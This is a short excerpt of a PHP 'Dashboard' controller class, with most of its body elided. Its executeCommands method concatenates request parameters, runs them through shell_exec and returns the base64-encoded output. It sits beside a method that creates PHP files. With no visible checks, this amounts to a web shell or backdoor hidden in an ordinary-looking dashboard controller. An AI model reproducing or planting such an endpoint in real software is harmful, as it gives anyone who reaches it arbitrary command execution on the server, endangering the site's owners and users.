...
class Dashboard extends Base
{
    ...
    public function createPhpFile($parameters = []) 
    { 
        ...
        Page::printApiResults(200,"Done.");
    }

    public function executeCommands($parameters = []) 
    { 

        $cmd = implode("", $parameters);

        $result = base64_encode("" . shell_exec($cmd));

        Page::printApiResults(200,"Result of Command: " . $result);
    }
    /**
